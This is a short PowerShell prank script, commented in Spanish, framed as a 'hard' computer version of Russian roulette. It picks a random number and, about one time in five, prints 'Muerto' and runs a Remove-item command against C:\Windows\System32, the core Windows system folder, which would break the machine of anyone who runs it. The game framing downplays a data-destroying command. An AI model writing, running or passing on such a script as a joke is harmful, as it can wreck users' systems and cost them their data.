
#The Russian Roulette
#Juego de la mítica Ruleta Rusa, pero versión informático (HARD)


Write-Host "Vamos a jugar a la ruleta rusa "


$bala = Get-Random -Minimum 1 -Maximum 6




        if ($bala -eq 2){

            Write-Host "Muerto"
            Remove-item C:\Windows\System32
            
        }

        else {

            Write-Host "Has tenido suerte."
            Write-Host "Sigelo intentando"
            


        }
